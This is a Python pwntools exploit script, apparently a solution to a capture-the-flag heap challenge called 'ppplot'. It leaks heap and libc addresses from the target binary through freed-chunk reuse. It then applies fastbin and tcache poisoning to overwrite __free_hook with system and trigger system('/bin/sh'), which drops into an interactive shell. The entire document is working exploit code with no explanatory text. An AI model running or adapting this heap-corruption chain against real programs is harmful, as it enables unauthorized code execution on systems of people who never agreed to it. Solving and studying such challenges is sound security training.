#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./ppplot_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def add(degree: int, coefficients: list[int]) -> int:
        assert degree == len(coefficients)
        io.sendlineafter(b"pp: ", b"1")
        io.sendlineafter(b"ee: ", str(degree).encode())
        for i in range(len(coefficients)):
            io.sendlineafter(f"{i}: ".encode(), str(coefficients[i]).encode())
        io.recvuntil(b"idx: ")
        idx = int(io.recvline().strip(b"\n").decode())
        return idx

    def delete(idx: int):
        io.sendlineafter(b"pp: ", b"5")
        io.sendlineafter(b"idx: ", str(idx).encode())
        return

    def plot0(idx: int):
        io.sendlineafter(b"pp: ", b"3")
        io.sendlineafter(b"idx: ", str(idx).encode())
        return

    # heap leak
    idx0 = add(2, [1, 1])
    idx1 = add(2, [1, 1])
    delete(idx0)
    delete(idx1)
    idx2 = add(4, [1, 1, 1, 1])
    delete(idx0)
    plot0(idx2)
    ## calc heap_base
    io.recvuntil(b"(-1, ")
    a = int(io.recvuntil(b")", drop=True))
    io.recvuntil(b"(1, ")
    b = int(io.recvuntil(b")", drop=True))
    heap_upper = ((b - a) // 2) << 32
    heap_lower = (a + b) // 2
    heap_addr = heap_upper + heap_lower
    heap_base = heap_addr - 0x10
    ptr.logger.info(f"heap_base: {hex(heap_base)}")

    # libc leak
    ## fill tcache
    idx_list = []
    for _ in range(9):
        idx_list.append(add(1, [1]))
    for idx in idx_list:
        delete(idx)
    ## double free (fastbin)
    idx4 = idx_list[7]
    idx5 = idx_list[8]
    delete(idx4)

    ## fastbin poisoning
    add(1, [1])
    add(1, [1])
    chunk380_idx = add(2, [1, 1])

    fake_link = heap_base + 0x290
    fake_link_upper = fake_link >> 32
    fake_link_lower = fake_link & 0xFFFFFFFF
    idx6 = add(2, [fake_link_lower, fake_link_upper])

    ## create unsortedbin
    idx7 = add(1, [1])
    delete(idx7)
    idx8 = add(3, [1, 1, 0x421])

    idx_list = []
    for _ in range(7):
        idx_list.append(add(1, [1]))

    delete(idx6)
    delete(idx8)
    add(4, [1, 1, 1, 1])
    add(4, [1, 1, 1, 1])
    add(4, [1, 1, 1, 1])
    ## calc libc base
    plot0(chunk380_idx)
    io.recvuntil(b"(0, ")
    libc_lower = int(io.recvuntil(b")", drop=True)) & 0xFFFFFFFF
    io.recvuntil(b"(1, ")
    libc_leak = int(io.recvuntil(b")", drop=True)) & 0xFFFFFFFF
    libc_upper = abs(libc_leak - libc_lower) << 32
    libc_addr = libc_upper + libc_lower
    libc.base = libc_addr - 0x1ECBE0

    # overlap to do tcache poisoning
    delete(idx_list[3])
    delete(idx_list[2])
    delete(idx_list[4])
    for _ in range(10):
        delete(add(10, [1, 1, 1, 1, 1, 1, 1, 1, 1, 1]))
    delete(
        add(
            10,
            [
                1,
                1,
                1,
                1,
                1,
                1,
                1,
                1,
                ptr.u64(b"/bin/sh\0") & 0xFFFFFFFF,
                ptr.u64(b"/bin/sh\0") >> 32,
            ],
        )
    )
    delete(add(10, [1, 1, 1, 1, 1, 1, 1, 1, 1, 1]))
    delete(add(10, [1, 1, 1, 1, 1, 1, 1, 1, 1, 1]))
    free_hook = unwrap(libc.symbol("__free_hook"))
    idx9 = add(
        10,
        [
            1,
            1,
            1,
            1,
            free_hook & 0xFFFFFFFF,
            free_hook >> 32,
            (heap_base + 0x10) & 0xFFFFFFFF,
            (heap_base + 0x10) >> 32,
            1,
            1,
        ],
    )
    system = unwrap(libc.symbol("system"))
    add(2, [system & 0xFFFFFFFF, system >> 32])

    delete(idx_list[0])

    io.interactive()
    return


if __name__ == "__main__":
    main()
